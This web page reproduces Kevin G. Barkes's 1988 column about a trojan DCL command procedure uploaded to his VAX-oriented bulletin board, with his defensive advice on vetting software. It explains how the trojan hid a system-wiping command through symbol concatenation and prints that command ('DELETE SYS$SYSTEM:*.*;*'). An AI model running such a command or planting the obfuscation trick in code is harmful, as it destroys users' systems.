<h3>The SYS$OUTPUT DCL trojan of 1988</h3>

In 1988, the BBS operator Kevin G. Barkes (aka KGB) saw someone trying to distribute a destructive trojan written in the language used in VAX machines; DIGITAL Command Language (DCL).
I asked about the sample, but it is gone - entered the digital realm and almost immediately exited left-  

<em>
"To be honest, I think I deleted the DCL command file immediately after writing the column. I didn’t want to risk it being accidentally copied or downloaded."
-KGB (Kevin G. Barkes)
</em>
<br><br>

However, KGB wrote the account below about the incident.
<br><br>



<code>
DCL DIALOGUE

by Kevin G. Barkes

Originally published November, 1988

Viruses, Trojans, and Code That Goes Bump in the Night

I guess it was inevitable.

Someone uploaded a "trojan" DCL command procedure to my
PC-based bulletin board system, SYS$OUTPUT. No damage was
done, aside from a slight weakening of my faith in
VAX-related BBS users.

I'm mentioning it here because DCL command procedures are
frequently overlooked as potential sources of viruses,
trojans, and other software bombs. After all, it's only
DCL, right? I mean, how could you possibly stick something
damaging in a DCL command file without it being immediately
spotted? 

The despicable individual who uploaded VMMAN.COM to my board
managed to camouflage the potentially devastating effects
quite imaginatively.
 
On the surface, the .COM file appeared as if it would do a
decent job of extracting information from and manipulating
the contents of VMSMAIL.DAT, the mail database file on VMS
4.x systems. 

Lurking deep within its utilitarian bowels, however, was a
single line of code that I almost missed:

$ 'F$EDIT(A1+A3+A4+DIR+WC,"TRIM")'

The line jumped out at me as I scrolled through it on the
PC's monitor. Fancy stuff, I thought. The programmer had
used symbol concatenation to construct a command string,
the contents of which varied depending upon the operation of 
the procedure. It was spiffy, efficient DCL, the kind I
like to feature in this column. I decided to contact the
author to see if I could include it in a future DCL
Dialogue, provided the procedure ran properly when I tested
it. 

I called the telephone number the uploader had provided when
he dialed into the system, but got a "no such number"
recording. The street address he provided did not match
the listing in my desktop zip code directory, either. 
Obviously, this fellow was trying to pull a fast one. 

First-time users on my BBS system have restricted
privileges. They cannot upload files or enter messages in
public areas until I verify them. The policy prevents
immature individuals ("twits", in BBS jargon) from entering 
offensive messages or uploading material which should not
reside on a public system. 

This individual was so hot for me to use the procedure that
he left it as a message to the sysop, which was certain to
get my attention. 

That it did. I dug back into the code, and made a rather
alarming discovery. The symbols in the F$EDIT string, which
were assigned in various places through the procedure, were
A1=D, A3=ELE, A4="TE ", DIR=SYS$SYSTEM:, and WC=*.*;*. 

When concatenated and used as contained within the
procedure, this friendly little file would issue the
command: 

$ DELETE SYS$SYSTEM:*.*;*

The offending line was preceded by code which turned off
error messaging, set the process' privileges to ALL and
performed several other steps to make certain the person
using the command file would be unaware of the damage being 
wreaked on his system directory until it would be too late. 
What made matters even more insidious were the
user-friendly comments contained in the code, explaining
why each action was taken. Even the symbols, system killers
when assembled by F$EDIT, had real, benign purposes when
used elsewhere within the file. 

I'm not going to tell you I discovered the trojan through
superb DCL skills. It was just dumb luck. My interest
piqued by a phony id, I just scrutinized the file a lot
more closely than usual. I don't care to imagine the 
consequences had I uploaded the procedure to Professional
Press' VAX and asked the system manager to "give it a
spin".

Safe Software

The timing of the trojan's arrival was ironic. Just the day
before I had received a letter from one of my BBS' users
asking whether I could assure his bosses that the software
he obtained from my board was "clean".

Unfortunately, no BBS sysop can do that. I know my board's
users; they are unlike most BBS denizens in that they are
virtually all professionals who use VAXen in their work. 
They have very little interest in games and the type of 
files downloaded by "typical" BBS users. But passwords can
be stolen, and even the most honest user can unknowingly
pass along a virus or trojan.

I told him that the odds of bad software residing on my
board were lower than a general-purpose BBS, but the threat
was there, thus the disclaimer on the download section. 
The little bundle delivered by my unknown DCL expert just 
brought home the point. 

So, what can you do to protect yourself?

o Remember that most public domain and "shareware" software
is offered on an as-is, unguaranteed basis. Stupidity
kills more systems than viruses, so be cautious and read
whatever documentation accompanies the program.

o Obtain software from reliable sources only, such as DECUS,
users' groups, and BBS systems you know and trust.

o Despite utmost care in executing the preceding steps,
always assume the worst and treat the new piece of software
as a potential bomb waiting to detonate.

o Avoid using .EXE files; try to get the source files, and
recompile and relink them. And be certain to look at the
source; as our DCL example here shows, the ability to read
the source doesn't mean the software is safe.

o Test all software from accounts with no privileges. 
Turning off your privs does no good when the program or
command file can switch them back on and inflict major
damage. Be especially careful when trying out a system 
management utility or other program which manipulates VMS
security structures, and which must be executed with
privileges in place.

Until this happened to me, I was skeptical of the hysterical
media reports concerning viruses. To a large degree, I
still think the problem is blown out of proportion.

But looking in the new uploads section of the ol' BBS is
getting a lot more traumatic than it used to be.

----------

Kevin G. Barkes is an independent consultant. He publishes
the KGB Report newsletter, operates the www.kgbreport.com website,
lurks on comp.os.vms, and can be reached at kgbarkes@gmail.com.

----------

Copyright 1988-2016 by Kevin G. Barkes

All rights reserved. This article may be duplicated or
redistributed provided no alterations of any kind are
made to this file.
<code>
